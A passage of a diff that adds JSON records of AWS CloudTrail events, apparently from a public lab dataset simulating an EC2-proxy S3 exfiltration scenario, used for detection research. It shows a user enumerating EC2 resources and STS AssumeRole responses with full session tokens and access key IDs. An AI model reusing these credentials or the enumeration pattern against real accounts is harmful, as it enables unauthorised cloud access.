+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAvailabilityZones",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "availabilityZoneSet": {},
+            "availabilityZoneIdSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 28,
+            "event_id": "ad9fac17-866b-4a2e-b15b-84c7c1a7fd7b"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-62dcdec3f5db633c8d9c50c8",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumeStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1d"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 29,
+            "event_id": "243e1796-b782-462e-b371-16455846443b"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-376175ba82305a8e38a65d6d",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumesModifications",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeVolumesModificationsRequest": {
+              "MaxResults": 1000
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 30,
+            "event_id": "a1ad1d2c-4a8d-4804-b1d3-9a4fdedebf3f"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-1071659059d435fde353a1d4",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumeStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1a"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 31,
+            "event_id": "a4b522a4-3b1c-4b47-b470-b15b6493991c"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-da08e52c25387c3312840b28",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:45:36.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeVolumes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "us-east-1c"
+                      }
+                    ]
+                  },
+                  "name": "availability-zone"
+                }
+              ]
+            },
+            "volumeSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 32,
+            "event_id": "af8f962a-79ad-470e-b955-7b4c07ffae6c"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-9304a6075123c16fe9d285f8",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:24.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-044b1baf4c96e1b62"
+                }
+              ]
+            },
+            "includeAllInstances": false,
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 33,
+            "event_id": "c893a79b-12c6-4f21-9490-c4920a30fa14"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-438ef287db9191d0ec698394",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:23.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceTypes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeInstanceTypesRequest": {
+              "NextToken": "AAIAAeVpF_2hq1N7S3Mi5dZl-O648yxmBew-zRHtIqJsaoPHjqsyZgswiA_0WxZu1MBAmteEmmCiGSc1FzKY-Frnutcb9j9IVM0YQ36R2z6HzYrehtVuUm_Kel2PQP5xpyJqz8DviWZ-kWAX1J0QtF99duXfEXw7nFU=",
+              "MaxResults": 100
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 34,
+            "event_id": "71b87b90-4502-49ba-98cb-773bfb6a402f"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-3318ea2682f9459bf832758e",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:23.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAddresses",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "i-044b1baf4c96e1b62"
+                      }
+                    ]
+                  },
+                  "name": "instance-id"
+                }
+              ]
+            },
+            "allocationIdsSet": {},
+            "publicIpsSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 35,
+            "event_id": "b1f20335-d4d4-4d9c-a215-4f6e501a6a8b"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-4d872959019e10506ff02c89",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:22.000Z",
+          "service": "monitoring.amazonaws.com",
+          "operation": "DescribeAlarms",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "excludeManagedAlarms": false,
+            "maxRecords": 100
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 36,
+            "event_id": "c4c3837f-8613-49f9-b1b0-e71306f4a71d"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-0bfe99652469342cc7d99d8b",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:22.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAddresses",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "i-0317f6c6b66ae9c40"
+                      },
+                      {
+                        "value": "i-044b1baf4c96e1b62"
+                      }
+                    ]
+                  },
+                  "name": "instance-id"
+                }
+              ]
+            },
+            "allocationIdsSet": {},
+            "publicIpsSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 37,
+            "event_id": "835fa1e2-8872-49f4-a838-eb9b8f14c1ec"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-4f15728fed698ed9537624d9",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:24.000Z",
+          "service": "compute-optimizer.amazonaws.com",
+          "operation": "GetEnrollmentStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": null,
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 38,
+            "event_id": "56536abf-0dce-480a-afbe-3bc8e1f60198"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-5cf5f4acc2c2e803da6ceeb6",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:50:17.000Z",
+          "service": "sts.amazonaws.com",
+          "operation": "AssumeRole",
+          "actor_type": "AWSService",
+          "actor_id": null,
+          "source_ip": "ec2.amazonaws.com",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "roleSessionName": "i-044b1baf4c96e1b62",
+            "roleArn": "arn:aws:iam::123456789123:role/MordorLogCollectorStack-LogCollectorRole-1JJTG88NNY4KN"
+          },
+          "response": {
+            "credentials": {
+              "sessionToken": "IQoJb3JpZ2luX2VjEKn//////////wEaCXVzLWVhc3QtMSJHMEUCIG/0fxJQUax3iemNToILPqQdcTDPzbAnUPGvrNUH/7b+AiEArHcl73fu6ppcd3v1rVO7fd5lVxHmonudJ0qnVDjEvF4qvQMIsv//////////ARABGgw5MDQ4ODI2NjcyOTIiDE6iGMQ5dbh4byldAyqRA5iyxvuO+0RlISoaR7p24RK2HlkFkSIa+kXMVpt/Jf+x1WFn3vYiXTR6YImU07qivSvjnnYzXkcPxuxE9Mu9sweHGFq8DMqXz2BktuljR2KPCNo8l4WTc5SdJ3ObvBAbWfuUKvM3IO1rEHwj0pgi3MNNYpV8vznNVKL/BGbhl0ybuXcpxCCBmUTgLBRho5WANax9DT2JHYI3v1vPdzU3634/GzBjpn/WvEP8np2fg7KoKXS01kqAbRNw44ROpaJ4Leu8ZnbK5VF8ZE6w8ezfe6l2NsFxstSoD1sLfQZmZUZL5n7+ivMbAMSoJfbfJgVTyLOpz+LK2rZnmSYH4OKQi8B9VvJJbmPDboOdgnfOtp/XSwvWYogTU4XjKOvXbI6yiFIK+ym6CXoZFLzlflngpdU2hXbiQnepmhxtjUMUpsSgv0hGTzrShrBGPkScA9r+19SCZjPwypO7huk4VpYrEVl591aUf7wCqaPE2ilF/upPRhnk4tmcVJqvt8jo4VA3gok61m/OSkegXNCcRVC2i/UvMMn8+voFOusB2HuKnFixv4QrVSemvRLq2KpmZBQgm5d68pSRhBnSMsNvWNyMZTYjer2l0GVbT9WmDBo8R01LWUVuA0fRi/gZ1/gffHdW5rvVL+vzZB27YBTXcZhtbaLc4SeHyQ0iJXpTUOqkqbe/SuO7L4QyubqOL9dVZqL9R6W88vEv7tNGL2YZRIOzDsqd/qrPU81E19mCMpMGBWWmGWuLKpf4TbvJwdQxfdT4C8inw9LVFPJTe6KUu1OhlNDYoaWKqYS++v9hBxlBLyt6CA7wWOclqBo4nEd/QLD4U4p3RwvfZgBDrqdjXsGP6sE2UaTFlA==",
+              "expiration": "Sep 14, 2020, 7:01:26 AM",
+              "accessKeyId": "ASIA5FLZVX4OLY6BJN4L"
+            }
+          },
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 39,
+            "event_id": "0f902c35-794c-4864-b2e0-3c4564b857b0"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-b4696509c5be57a4ed3bac1f",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:50:17.000Z",
+          "service": "sts.amazonaws.com",
+          "operation": "AssumeRole",
+          "actor_type": "AWSService",
+          "actor_id": null,
+          "source_ip": "ec2.amazonaws.com",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "roleSessionName": "i-044b1baf4c96e1b62",
+            "roleArn": "arn:aws:iam::123456789123:role/MordorLogCollectorStack-LogCollectorRole-1JJTG88NNY4KN"
+          },
+          "response": {
+            "credentials": {
+              "sessionToken": "IQoJb3JpZ2luX2VjEKn//////////wEaCXVzLWVhc3QtMSJGMEQCIEGSwE/YnR3Y0L6SpT116uK7u7VN6i3/hKKdSXTb4/wTAiA0u9KyvWv5W+4jr3fiSoSAd+8QORZfd7907daNO+RNrCq9Awiy//////////8BEAEaDDkwNDg4MjY2NzI5MiIM2laaTVgfonPaxV6cKpEDJQ+0mF/qIStnuk4FLd+oBwKEa+fCQvQXHFZWandJN7QmJzdqFCm4cXNI7IsiXPDTchNK/+NM1vwCeNdfvbN9r5HrVkozxP364T0FTd+fwGEaxel7UOJn2L3cewqBF3xKHYuDH8LY5eAvSbYsz7jzDfwuaKDXwB69JCF1I5S3OnsT13LkWB8BHwhNBRNyANOCECFtm4Uut9Kt7pEe9VIIERBR3PvAS2Qz8O5te3nbNewqkVo015v3fBkhV+6jKB/ngAEdBPwyXogZn3+TvAIuY1T6kRlWyNSfmENfNFEK+u1oKwa8kG5q9eRxDHi9c1qWiR8zkjeWN9p0JKkAJWPuVwTDzXEuAsKWZ+631KIhZLxL5+BrxkI4tcTKE+zjQbz6fwqfStUfGrZ2GnqaK7GAzQTjbGn8aZ7r4cij8GBnRaysf/kLFOs+ID9LXO0PrnRj8wSka2HqHedsODK1x35CaRZWXjsb/8VVbQrWDRLHkUcgFGz9dHpZMUtxhJtFrXQus+O0jWT9NVNBx83ZcfYpjHwwyfz6+gU67AEb6UhIIBYqS9z5V85jBCOjB0XOrtuXTxMQIlZYP96w6QX0WsgEZWog3toHLRC37EZxYcdkShsormoIUDweQ05ydUDSKg4q0HCPPK46AJOKQVEO+0/KuEtXnSs7Y4QtPuV+hAweuFfulgGHvTkyZKCKNjBwhxbhgGLN940wqS8lYvnblVJrdKeBCmyHNePtSIsZBzkniAJhzE0+Ixpo3ANMrEeyEEKa8i5yF0Qjn6yjfYhrtB7BvYKAXymaSruhIaoTDqy0HATjcnQsluWu96VfRnFOwfU/1DAdejC9HxW0w0cfI9SioYQQxW9q9Q==",
+              "expiration": "Sep 14, 2020, 7:14:11 AM",
+              "accessKeyId": "ASIA5FLZVX4OK6HMTKWY"
+            }
+          },
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 40,
+            "event_id": "c9dd614e-0d2e-4c01-992a-eec74b38399b"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-883848726e4fc24a4ad8d827",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:48:30.000Z",
+          "service": "sts.amazonaws.com",
+          "operation": "AssumeRole",
+          "actor_type": "AWSService",
+          "actor_id": null,
+          "source_ip": "ec2.amazonaws.com",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "roleSessionName": "i-0317f6c6b66ae9c40",
+            "roleArn": "arn:aws:iam::123456789123:role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0"
+          },
+          "response": {
+            "credentials": {
+              "sessionToken": "IQoJb3JpZ2luX2VjEKn//////////wEaCXVzLWVhc3QtMSJHMEUCIQDJXCGmKi66JIrX2XBZfquA8Ni2XgqYWEjIkn4deo+4oQIgQ0cDL/22dTOq8KavbBuoEVAz6CiCYPpTmQFwMIzAVXUqvQMIsv//////////ARABGgw5MDQ4ODI2NjcyOTIiDF9pwF9gZcNsv2VETCqRAwfunZ/OaITfwure2qtJqROmRaoUQIqaErHWuf1g5RO2Jng10Bm34fdSUKZe8C5jjiykwWCcfUBRecbyDxVJ3Ct3H6wX4VbGdEOtODRrqvuUd9JlC6hzZ5uvt9YCumUf45bduwo8gNfVIJbcMfvCOVYj50eKPj+USZ8cDORvPcvEp0HBLewULR6EYIQ276PuXXETxcRNqjPO2gngE8C20AQZY20/pgZ1/lw1auyPvfFgvNIh35qBiJRtZSrXc69hGqBPY176htav+s/fuJdFejaTM7oJnPfHI4Y4Jqtc6wQjuTPIQPL3ODbw1wvsT37hMzGUP2Ab8rWHEweKJcth5jvVjZup8ec31ge+dlqFlKSZ9CQTmRt80RyPl+LlSKXfSgprGEjzEdYBbk1sHj4vdh4tUImS1+uy/1k84iLlmUOvg7oHbiLvuAZdrCe/7sSvyg36l+mG43/aRSJFoyp21laofx4m/iuSbJGK/NA2mkXyWyPyEQ0xuZaXBJdanB4Zhd59SD+3CYtyU4bKT9Y9Dj2mMN77+voFOusBlH686E8yaGz4qlzZJ1hwbXL8zKsv8I/yR/9rYpB0Qpd7T6DXxhNz79bOYVQVgfi4DDozV1f4Ts1qS6CPOpatY8hKhRlADa4KrO2D+Xfo+frT94qQQ1lj4JqgsnCrjyrYGY8jyYW6fIivtRWj4eh9NMZoMZPBYmfnq1CYEm3C0BP7Iw4PRBnyNlhTafvIoEjB04Hw8md3jilxVOIUmEz6se5X0W8ZQgmCJrIn2aMIWlgB+QDTZydrljZJHzxLwPFhWSGstVgH3KV5l4kYRw1iQcbWQXLi+f1mZzLLWGRhpwrj8hYpXQ5gn0de2g==",
+              "expiration": "Sep 14, 2020, 6:57:19 AM",
+              "accessKeyId": "ASIA5FLZVX4OAET5K4P5"
+            }
+          },
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 41,
+            "event_id": "1da77391-d4f7-4c3f-bc15-dcb4e5e1e4d8"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-b7cff57be6865f063968d205",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:48:30.000Z",
+          "service": "sts.amazonaws.com",
+          "operation": "AssumeRole",
+          "actor_type": "AWSService",
+          "actor_id": null,
+          "source_ip": "ec2.amazonaws.com",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "roleSessionName": "i-0317f6c6b66ae9c40",
+            "roleArn": "arn:aws:iam::123456789123:role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0"
+          },
+          "response": {
+            "credentials": {
+              "sessionToken": "IQoJb3JpZ2luX2VjEKn//////////wEaCXVzLWVhc3QtMSJHMEUCIEE7NhgFqTBHQY6jp3FlKsmXQHdQd4aB0xxWS3BvNYYNAiEAikVOWBpjA+0W99zTB2zpve2ylx8Kl4Q2AcqJjs1bmQMqvQMIsv//////////ARABGgw5MDQ4ODI2NjcyOTIiDEONTqwt1GfGav6ZYyqRAzBEfRIR+VI5NFIoHsOq19omAa2nh2qYyeh6P4U0U+//w9uo6mL2BngYEBasyso06Qo86pQB0gyLHs1rHo6JwV9CdCz40cdnVSxe/0skm/XcrY5AC5LyUMOb41zfCOvfHNZAunnYILZosd06+wXyJVkcrYLB3E4O/PSJLEZwGUrHjhNJcvdX5++jm8aaQXbNpV8D///DpHC7F/JhE9nBmbpQZ6v7yEiDT4zg4fOsfvDFBY/JsaUQ90pVaQMei71cX4gepfJvyjG2p1x18NArpyq3wKVnObb14a9SJFkW1P6/mdb3Uor0tlfj+9cLgmZgkS6OujBugRQZ9a7C3CPu8w2wJ+t6Oqa9BiIgz6feiH33nZyz9pl1vW7vTsyPU7M1Lecd8Hv7svT9HatLWHvp85zI8mcW8tnIZyxyW0T6Fl3lm7WcIRaZ2bbTnY6IJOPanrI9CsRWs9irpp2Kw/MX8o4rd3VLOTW2YLhIyabZb7bV3+uo8G0IcYgi8TuUg/7ZigaCRXpZ/UNWWL2vabE8YCWZMN77+voFOusBZeMN6VBGKGC2CzARs5opa5LpykgBQeVDXeiCKdr+9VsfOT21qYctDdsYWah9UnaPcdWxjJroSwE6NALuqEGnMSoT2R/fyqzI2iizuph1yYpS+P9ZWwSzCF9y56p9OXz8+FNBzU+ZgPcPWOe8CgLjfDeaGoAPux2eKr8GsG6QUxwXionmpe/S8c5AKEfHYxEEtuctlIyRUu5uGxLT0wLwj1CzpcQz66TtSA3QjdjoiCDFiLyAXHPbU7hfz6acAkRVShDdIJT3wvUilpr02SejXmid6XCsfA7i7q58snS2FNYMTKLO/qJnkzd5Sg==",
+              "expiration": "Sep 14, 2020, 6:51:49 AM",
+              "accessKeyId": "ASIA5FLZVX4OO3RUSEX6"
+            }
+          },
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 42,
+            "event_id": "a2de2399-b9c8-494d-b76f-cb0c377784c5"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-097f966362ce547e4c728537",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:48:30.000Z",
+          "service": "sts.amazonaws.com",
+          "operation": "AssumeRole",
+          "actor_type": "AWSService",
+          "actor_id": null,
+          "source_ip": "ec2.amazonaws.com",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "roleSessionName": "i-0317f6c6b66ae9c40",
+            "roleArn": "arn:aws:iam::123456789123:role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0"
+          },
+          "response": {
+            "credentials": {
